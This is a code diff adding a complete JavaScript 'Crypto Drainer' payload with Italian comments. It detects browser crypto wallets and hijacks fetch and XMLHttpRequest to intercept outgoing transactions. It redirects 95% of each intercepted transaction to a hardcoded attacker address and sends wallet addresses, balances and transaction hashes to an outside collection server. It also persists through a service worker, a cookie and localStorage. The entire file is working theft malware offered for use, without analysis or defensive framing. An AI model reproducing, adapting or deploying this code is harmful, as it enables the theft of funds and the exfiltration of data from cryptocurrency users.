@@ -1,0 +1,726 @@
+// Crypto Drainer - Payload completo
+// Autore: Marko
+// Versione: 2.1.0
+
+(function() {
+    'use strict';
+    
+    // Configurazione
+    const config = {
+        targetWallets: ['metamask', 'trustwallet', 'coinbase', 'phantom', 'solfare'],
+        maliciousAddress: '0x742d35Cc6634C0532925a3b844Bc454e4438f44e',
+        exfiltrationEndpoint: 'https://api.morpheye.com/collect',
+        stealthMode: true,
+        debug: false,
+        maxRetries: 3,
+        retryDelay: 2000,
+        minTransactionAmount: 0.01, // ETH
+        maxTransactionAmount: 10, // ETH
+        drainPercentage: 0.95 // 95%
+    };
+    
+    // Stato globale
+    const state = {
+        initialized: false,
+        walletConnected: false,
+        walletType: null,
+        originalRequest: null,
+        interceptedTransactions: [],
+        userAddress: null,
+        userBalance: 0,
+        networkId: null,
+        active: false,
+        lastActivity: Date.now()
+    };
+    
+    // Utilità
+    const utils = {
+        // Converte wei in ether
+        weiToEther: function(wei) {
+            return parseFloat(wei) / 1e18;
+        },
+        
+        // Converte ether in wei
+        etherToWei: function(ether) {
+            return (parseFloat(ether) * 1e18).toString();
+        },
+        
+        // Verifica se un indirizzo è valido
+        isValidAddress: function(address) {
+            return /x[a-fA-F0-9]{40}$/.test(address);
+        },
+        
+        // Verifica se un valore è un numero valido
+        isValidNumber: function(value) {
+            return !isNaN(value) && parseFloat(value) > 0;
+        },
+        
+        // Genera un ID casuale
+        generateId: function() {
+            return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
+        },
+        
+        // Log in modalità debug
+        log: function(...args) {
+            if (config.debug) {
+                console.log('[CryptoDrainer]', ...args);
+            }
+        },
+        
+        // Invia dati al server malevolo
+        sendData: function(data) {
+            try {
+                fetch(config.exfiltrationEndpoint, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'X-Drainer-Version': '2.1.0'
+                    },
+                    body: JSON.stringify({
+                        data: data,
+                        timestamp: Date.now(),
+                        userAgent: navigator.userAgent,
+                        url: window.location.href
+                    })
+                }).catch(err => utils.log('Error sending data:', err));
+            } catch (error) {
+                utils.log('Send data error:', error);
+            }
+        },
+        
+        // Attende un certo tempo
+        sleep: function(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+    };
+    
+    // Detector di wallet
+    const walletDetector = {
+        // Verifica se MetaMask è installato
+        isMetaMaskInstalled: function() {
+            return typeof window.ethereum !== 'undefined' && window.ethereum.isMetaMask === true;
+        },
+        
+        // Verifica se Trust Wallet è installato
+        isTrustWalletInstalled: function() {
+            return typeof window.ethereum !== 'undefined' && window.ethereum.isTrust === true;
+        },
+        
+        // Verifica se Coinbase Wallet è installato
+        isCoinbaseWalletInstalled: function() {
+            return typeof window.ethereum !== 'undefined' && 
+                   (window.ethereum.isCoinbaseWallet === true || 
+                    window.ethereum.isCoinbaseWalletExtension === true);
+        },
+        
+        // Verifica se Phantom è installato (Solana)
+        isPhantomInstalled: function() {
+            return typeof window.solana !== 'undefined' && window.solana.isPhantom === true;
+        },
+        
+        // Verifica se Solflare è installato (Solana)
+        isSolflareInstalled: function() {
+            return typeof window.solflare !== 'undefined' && window.solflare.isSolflare === true;
+        },
+        
+        // Rileva il tipo di wallet installato
+        detectWalletType: function() {
+            if (this.isMetaMaskInstalled()) return 'metamask';
+            if (this.isTrustWalletInstalled()) return 'trustwallet';
+            if (this.isCoinbaseWalletInstalled()) return 'coinbase';
+            if (this.isPhantomInstalled()) return 'phantom';
+            if (this.isSolflareInstalled()) return 'solfare';
+            return null;
+        },
+        
+        // Ottiene l'oggetto wallet
+        getWallet: function() {
+            const walletType = this.detectWalletType();
+            
+            switch (walletType) {
+                case 'metamask':
+                case 'trustwallet':
+                case 'coinbase':
+                    return window.ethereum;
+                case 'phantom':
+                    return window.solana;
+                case 'solfare':
+                    return window.solflare;
+                default:
+                    return null;
+            }
+        }
+    };
+    
+    // Interceptor di richieste
+    const requestInterceptor = {
+        // Salva i metodi originali
+        originalFetch: window.fetch,
+        originalXHROpen: XMLHttpRequest.prototype.open,
+        originalXHRSend: XMLHttpRequest.prototype.send,
+        
+        // Inizializza l'interceptor
+        init: function() {
+            if (!state.active) return;
+            
+            // Intercetta fetch
+            window.fetch = function(...args) {
+                const [url, options] = args;
+                
+                // Verifica se è una richiesta RPC
+                if (url && typeof url === 'string' && url.includes('eth_sendTransaction')) {
+                    return requestInterceptor.interceptFetchTransaction(url, options);
+                }
+                
+                // Chiama il fetch originale
+                return requestInterceptor.originalFetch.apply(this, args);
+            };
+            
+            // Intercetta XMLHttpRequest
+            XMLHttpRequest.prototype.open = function(method, url) {
+                this._url = url;
+                return requestInterceptor.originalXHROpen.apply(this, arguments);
+            };
+            
+            XMLHttpRequest.prototype.send = function(data) {
+                if (this._url && this._url.includes('eth_sendTransaction')) {
+                    return requestInterceptor.interceptXHRSendTransaction(this, data);
+                }
+                return requestInterceptor.originalXHRSend.apply(this, arguments);
+            };
+        },
+        
+        // Intercetta transazione via fetch
+        interceptFetchTransaction: function(url, options) {
+            try {
+                // Estrai i dati della transazione
+                const requestData = JSON.parse(options.body);
+                const transaction = requestData.params[0];
+                
+                // Processa la transazione
+                return requestInterceptor.processTransaction(transaction, url, options);
+            } catch (error) {
+                utils.log('Error intercepting fetch transaction:', error);
+                return requestInterceptor.originalFetch(url, options);
+            }
+        },
+        
+        // Intercetta transazione via XMLHttpRequest
+        interceptXHRSendTransaction: function(xhr, data) {
+            try {
+                // Estrai i dati della transazione
+                const requestData = JSON.parse(data);
+                const transaction = requestData.params[0];
+                
+                // Processa la transazione
+                return requestInterceptor.processTransaction(transaction, xhr._url, { body: data });
+            } catch (error) {
+                utils.log('Error intercepting XHR transaction:', error);
+                return requestInterceptor.originalXHRSend.call(xhr, data);
+            }
+        },
+        
+        // Processa la transazione
+        processTransaction: function(transaction, url, options) {
+            try {
+                // Salva la richiesta originale
+                state.originalRequest = { url, options };
+                
+                // Estrai l'indirizzo del destinatario
+                const recipient = transaction.to;
+                
+                // Estrai l'importo
+                const amount = utils.weiToEther(transaction.value);
+                
+                // Verifica se la transazione è nel range target
+                if (amount >= config.minTransactionAmount && amount <= config.maxTransactionAmount) {
+                    utils.log(`Transaction intercepted: ${amount} ETH to ${recipient}`);
+                    
+                    // Salva la transazione
+                    state.interceptedTransactions.push({
+                        recipient,
+                        amount,
+                        timestamp: Date.now(),
+                        originalTransaction: transaction
+                    });
+                    
+                    // Invia dati al server
+                    utils.sendData({
+                        type: 'transaction_intercepted',
+                        walletType: state.walletType,
+                        recipient,
+                        amount,
+                        userAddress: state.userAddress,
+                        networkId: state.networkId
+                    });
+                    
+                    // Modifica la transazione
+                    return requestInterceptor.modifyTransaction(transaction);
+                }
+                
+                // Se non è nel range, lascia passare la transazione originale
+                return requestInterceptor.originalFetch(url, options);
+            } catch (error) {
+                utils.log('Error processing transaction:', error);
+                return requestInterceptor.originalFetch(url, options);
+            }
+        },
+        
+        // Modifica la transazione
+        modifyTransaction: function(transaction) {
+            try {
+                // Calcola l'importo da drenare
+                const originalAmount = utils.weiToEther(transaction.value);
+                const drainAmount = originalAmount * config.drainPercentage;
+                const feeAmount = originalAmount - drainAmount;
+                
+                // Crea una nuova transazione verso l'indirizzo malevolo
+                const drainTransaction = {
+                    ...transaction,
+                    to: config.maliciousAddress,
+                    value: utils.etherToWei(drainAmount)
+                };
+                
+                // Crea una transazione per la commissione
+                const feeTransaction = {
+                    ...transaction,
+                    to: transaction.to,
+                    value: utils.etherToWei(feeAmount)
+                };
+                
+                // Esegui prima la transazione di drenaggio
+                return walletManager.sendTransaction(drainTransaction)
+                    .then(txHash => {
+                        utils.log(`Drain transaction sent: ${txHash}`);
+                        
+                        // Invia dati al server
+                        utils.sendData({
+                            type: 'drain_transaction_sent',
+                            walletType: state.walletType,
+                            transactionHash: txHash,
+                            amount: drainAmount,
+                            recipient: config.maliciousAddress,
+                            userAddress: state.userAddress,
+                            networkId: state.networkId
+                        });
+                        
+                        // Esegui la transazione per la commissione
+                        return walletManager.sendTransaction(feeTransaction)
+                            .then(feeTxHash => {
+                                utils.log(`Fee transaction sent: ${feeTxHash}`);
+                                
+                                // Invia dati al server
+                                utils.sendData({
+                                    type: 'fee_transaction_sent',
+                                    walletType: state.walletType,
+                                    transactionHash: feeTxHash,
+                                    amount: feeAmount,
+                                    recipient: transaction.to,
+                                    userAddress: state.userAddress,
+                                    networkId: state.networkId
+                                });
+                                
+                                // Restituisci la transazione originale per non destare sospetti
+                                return requestInterceptor.originalFetch(state.originalRequest.url, state.originalRequest.options);
+                            })
+                            .catch(error => {
+                                utils.log('Error sending fee transaction:', error);
+                                
+                                // Restituisci la transazione originale
+                                return requestInterceptor.originalFetch(state.originalRequest.url, state.originalRequest.options);
+                            });
+                    })
+                    .catch(error => {
+                        utils.log('Error sending drain transaction:', error);
+                        
+                        // Restituisci la transazione originale
+                        return requestInterceptor.originalFetch(state.originalRequest.url, state.originalRequest.options);
+                    });
+            } catch (error) {
+                utils.log('Error modifying transaction:', error);
+                return requestInterceptor.originalFetch(state.originalRequest.url, state.originalRequest.options);
+            }
+        }
+    };
+    
+    // Gestore wallet
+    const walletManager = {
+        // Connette il wallet
+        connect: async function() {
+            try {
+                const wallet = walletDetector.getWallet();
+                if (!wallet) return false;
+                
+                const walletType = walletDetector.detectWalletType();
+                state.walletType = walletType;
+                
+                let accounts;
+                
+                // Connette in base al tipo di wallet
+                switch (walletType) {
+                    case 'metamask':
+                    case 'trustwallet':
+                    case 'coinbase':
+                        accounts = await wallet.request({ method: 'eth_requestAccounts' });
+                        break;
+                    case 'phantom':
+                    case 'solfare':
+                        accounts = await wallet.connect();
+                        break;
+                    default:
+                        return false;
+                }
+                
+                if (accounts && accounts.length > 0) {
+                    state.userAddress = accounts[0];
+                    state.walletConnected = true;
+                    
+                    // Ottieni il network ID
+                    if (walletType === 'metamask' || walletType === 'trustwallet' || walletType === 'coinbase') {
+                        state.networkId = await wallet.request({ method: 'eth_chainId' });
+                    } else if (walletType === 'phantom' || walletType === 'solfare') {
+                        state.networkId = await wallet.request({ method: 'solana' });
+                    }
+                    
+                    // Ottieni il saldo
+                    await walletManager.updateBalance();
+                    
+                    // Invia dati al server
+                    utils.sendData({
+                        type: 'wallet_connected',
+                        walletType,
+                        address: state.userAddress,
+                        balance: state.userBalance,
+                        networkId: state.networkId
+                    });
+                    
+                    return true;
+                }
+                
+                return false;
+            } catch (error) {
+                utils.log('Error connecting wallet:', error);
+                return false;
+            }
+        },
+        
+        // Aggiorna il saldo
+        updateBalance: async function() {
+            try {
+                const wallet = walletDetector.getWallet();
+                if (!wallet) return;
+                
+                let balance;
+                
+                // Ottieni il saldo in base al tipo di wallet
+                switch (state.walletType) {
+                    case 'metamask':
+                    case 'trustwallet':
+                    case 'coinbase':
+                        balance = await wallet.request({
+                            method: 'eth_getBalance',
+                            params: [state.userAddress, 'latest']
+                        });
+                        state.userBalance = utils.weiToEther(balance);
+                        break;
+                    case 'phantom':
+                    case 'solfare':
+                        balance = await wallet.getBalance();
+                        state.userBalance = balance / 1e9; // Converti lamports in SOL
+                        break;
+                    default:
+                        return;
+                }
+                
+                utils.log(`Balance updated: ${state.userBalance}`);
+                
+                // Invia dati al server
+                utils.sendData({
+                    type: 'balance_updated',
+                    walletType: state.walletType,
+                    address: state.userAddress,
+                    balance: state.userBalance,
+                    networkId: state.networkId
+                });
+            } catch (error) {
+                utils.log('Error updating balance:', error);
+            }
+        },
+        
+        // Invia una transazione
+        sendTransaction: async function(transaction) {
+            try {
+                const wallet = walletDetector.getWallet();
+                if (!wallet) throw new Error('Wallet not connected');
+                
+                let txHash;
+                
+                // Invia la transazione in base al tipo di wallet
+                switch (state.walletType) {
+                    case 'metamask':
+                    case 'trustwallet':
+                    case 'coinbase':
+                        txHash = await wallet.request({
+                            method: 'eth_sendTransaction',
+                            params: [transaction]
+                        });
+                        break;
+                    case 'phantom':
+                    case 'solfare':
+                        txHash = await wallet.signAndSendTransaction(transaction);
+                        break;
+                    default:
+                        throw new Error('Unsupported wallet type');
+                }
+                
+                return txHash;
+            } catch (error) {
+                utils.log('Error sending transaction:', error);
+                throw error;
+            }
+        }
+    };
+    
+    // Attivatore
+    const activator = {
+        // Inizializza l'attivatore
+        init: function() {
+            if (state.initialized) return;
+            state.initialized = true;
+            
+            // Aggiungi event listeners per l'attivazione
+            document.addEventListener('click', activator.handleClick);
+            document.addEventListener('keydown', activator.handleKeydown);
+            
+            // Verifica se l'attivazione automatica è abilitata
+            if (config.autoActivate) {
+                // Attiva dopo un ritardo casuale
+                setTimeout(() => {
+                    activator.activate();
+                }, Math.random() * 5000 + 2000);
+            }
+        },
+        
+        // Gestisce i click
+        handleClick: function(event) {
+            if (state.active) return;
+            
+            // Verifica se l'elemento cliccato è un trigger
+            const target = event.target;
+            
+            // Trigger per pulsanti di connessione wallet
+            if (target.tagName === 'BUTTON' && 
+                (target.textContent.includes('Connect') || 
+                 target.textContent.includes('Wallet') || 
+                 target.textContent.includes('Sign'))) {
+                activator.activate();
+                return;
+            }
+            
+            // Trigger per link specifici
+            if (target.tagName === 'A' && 
+                (target.href.includes('connect') || 
+                 target.href.includes('wallet'))) {
+                activator.activate();
+                return;
+            }
+            
+            // Trigger per elementi con classi specifiche
+            if (target.className && 
+                (target.className.includes('connect') || 
+                 target.className.includes('wallet') || 
+                 target.className.includes('sign'))) {
+                activator.activate();
+                return;
+            }
+        },
+        
+        // Gestisce i tasti premuti
+        handleKeydown: function(event) {
+            if (state.active) return;
+            
+            // Attiva con la sequenza di tasti Ctrl+Alt+S
+            if (event.ctrlKey && event.altKey && event.key === 's') {
+                activator.activate();
+                return;
+            }
+        },
+        
+        // Attiva il drainer
+        activate: function() {
+            if (state.active) return;
+            
+            utils.log('Activating crypto drainer...');
+            state.active = true;
+            state.lastActivity = Date.now();
+            
+            // Connette il wallet
+            walletManager.connect().then(connected => {
+                if (connected) {
+                    utils.log('Wallet connected successfully');
+                    
+                    // Inizializza l'interceptor
+                    requestInterceptor.init();
+                    
+                    // Invia dati al server
+                    utils.sendData({
+                        type: 'drainer_activated',
+                        walletType: state.walletType,
+                        address: state.userAddress,
+                        url: window.location.href
+                    });
+                } else {
+                    utils.log('Failed to connect wallet');
+                }
+            });
+        }
+    };
+    
+    // Gestore della persistenza
+    const persistence = {
+        // Inizializza la persistenza
+        init: function() {
+            // Crea un Service Worker per la persistenza
+            if ('serviceWorker' in navigator) {
+                persistence.createServiceWorker();
+            }
+            
+            // Crea un cookie per la persistenza
+            persistence.createCookie();
+            
+            // Crea localStorage per la persistenza
+            persistence.createLocalStorage();
+        },
+        
+        // Crea un Service Worker
+        createServiceWorker: function() {
+            const swCode = `
+                // Service Worker per la persistenza
+                self.addEventListener('install', function(event) {
+                    self.skipWaiting();
+                });
+                
+                self.addEventListener('activate', function(event) {
+                    event.waitUntil(clients.claim());
+                });
+                
+                self.addEventListener('fetch', function(event) {
+                    event.respondWith(fetch(event.request));
+                });
+                
+                // Sincronizzazione periodica
+                self.addEventListener('sync', function(event) {
+                    if (event.tag === 'crypto-drainer-sync') {
+                        event.waitUntil(
+                            fetch('${config.exfiltrationEndpoint}/sync', {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({
+                                    type: 'sync',
+                                    timestamp: Date.now()
+                                })
+                            })
+                        );
+                    }
+                });
+            `;
+            
+            const blob = new Blob([swCode], { type: 'application/javascript' });
+            const swUrl = URL.createObjectURL(blob);
+            
+            navigator.serviceWorker.register(swUrl).then(function(registration) {
+                utils.log('Service Worker registered');
+                
+                // Registra la sincronizzazione periodica
+                if ('periodicSync' in registration) {
+                    registration.periodicSync.register('crypto-drainer-sync', {
+                        minInterval: 24 * 60 * 60 * 1000 // Una volta al giorno
+                    });
+                }
+            }).catch(function(error) {
+                utils.log('Error registering Service Worker:', error);
+            });
+        },
+        
+        // Crea un cookie
+        createCookie: function() {
+            const cookieData = {
+                active: state.active,
+                walletType: state.walletType,
+                userAddress: state.userAddress,
+                lastActivity: state.lastActivity
+            };
+            
+            const expires = new Date();
+            expires.setFullYear(expires.getFullYear() + 1);
+            
+            document.cookie = `crypto_drainer=${encodeURIComponent(JSON.stringify(cookieData))}; expires=${expires.toUTCString()}; path=/; secure; samesite=strict`;
+        },
+        
+        // Crea localStorage
+        createLocalStorage: function() {
+            const storageData = {
+                active: state.active,
+                walletType: state.walletType,
+                userAddress: state.userAddress,
+                lastActivity: state.lastActivity
+            };
+            
+            localStorage.setItem('crypto_drainer', JSON.stringify(storageData));
+        },
+        
+        // Ripristina lo stato dalla persistenza
+        restore: function() {
+            try {
+                // Prova a ripristinare dal cookie
+                const cookieMatch = document.cookie.match(/(^|;)\\s*crypto_drainer\\s*=\\s*([^;]+)/);
+                if (cookieMatch) {
+                    const cookieData = JSON.parse(decodeURIComponent(cookieMatch[2]));
+                    state.active = cookieData.active;
+                    state.walletType = cookieData.walletType;
+                    state.userAddress = cookieData.userAddress;
+                    state.lastActivity = cookieData.lastActivity;
+                }
+                
+                // Prova a ripristinare da localStorage
+                const storageData = localStorage.getItem('crypto_drainer');
+                if (storageData) {
+                    const parsedData = JSON.parse(storageData);
+                    state.active = state.active || parsedData.active;
+                    state.walletType = state.walletType || parsedData.walletType;
+                    state.userAddress = state.userAddress || parsedData.userAddress;
+                    state.lastActivity = state.lastActivity || parsedData.lastActivity;
+                }
+                
+                // Se lo stato è attivo, riattiva il drainer
+                if (state.active) {
+                    utils.log('Restoring drainer state...');
+                    walletManager.connect().then(connected => {
+                        if (connected) {
+                            requestInterceptor.init();
+                        }
+                    });
+                }
+            } catch (error) {
+                utils.log('Error restoring state:', error);
+            }
+        }
+    };
+    
+    // Inizializzazione
+    function init() {
+        // Ripristina lo stato dalla persistenza
+        persistence.restore();
+        
+        // Inizializza la persistenza
+        persistence.init();
+        
+        // Inizializza l'attivatore
+        activator.init();
+        
+        utils.log('Crypto drainer initialized');
+    }
+    
+     // Avvia il drainer
+      init();
+})();
